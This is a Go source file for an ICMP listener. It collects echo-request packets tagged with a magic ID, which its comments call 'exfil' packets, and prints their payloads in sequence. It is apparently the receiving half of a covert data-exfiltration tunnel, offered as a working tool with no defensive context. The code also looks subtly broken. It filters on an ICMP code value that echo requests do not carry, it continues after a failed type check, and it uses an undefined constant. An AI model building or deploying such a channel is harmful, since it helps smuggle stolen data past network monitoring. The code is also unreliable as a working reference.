package main

import (
	"flag"
	"fmt"
	"log"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const BUFFERSIZE = 1600
const IPV4ICMP = 1
const IPV4ICMPREQUEST = 8

func main() {
	var help = flag.Bool("h", false, "show help.")
	var host = flag.String("l", "127.0.0.1", "the location ip to read from")

	flag.Parse()

	if *help {
		flag.PrintDefaults()
		return
	}
	buf := make([]byte, BUFFERSIZE)
	socket, sockErr := icmp.ListenPacket("ip4:icmp", *host)
	if nil != sockErr {
		log.Fatalln(sockErr)
		return
	}
	currentSeq := 0

	for {
		bytesRead, source, readErr := socket.ReadFrom(buf)

		// failed to read
		if nil != readErr {
			fmt.Println("error reading occured")
			fmt.Println(readErr)
			continue
		}

		// no source given somehow?
		if nil == source {
			fmt.Println("no source")
		}

		// no bytes were read
		if 0 == bytesRead {
			fmt.Println("no bytes read")
		}
		message, parseError := icmp.ParseMessage(IPV4ICMP, buf[0:bytesRead])
		if nil != parseError {
			fmt.Println("parse error")
			fmt.Println(parseError)
			continue
		}

		// only care about ICMP messages
		if IPV4ICMP != message.Code {
			fmt.Println("non icmp message")
			continue
		}

		// only care about request messages
		if ipv4.ICMPType(IPV4ICMPREQUEST) != message.Type {
			continue
		}

		// get the underlying echo message
		echoPak, echoErr := message.Body.(*icmp.Echo)
		if false == echoErr {
			fmt.Println("error parsing echo packet")
		}

		// only care about exfil type packets
		if MAGIC != echoPak.ID {
			fmt.Println("non exfil packet")
			continue
		}

		// make sure we are maintaining packet order
		if currentSeq != echoPak.Seq {
			fmt.Println("packet out of order")
			continue
		}
		currentSeq++
		fmt.Printf("%x\n", echoPak.Data)
	}

}
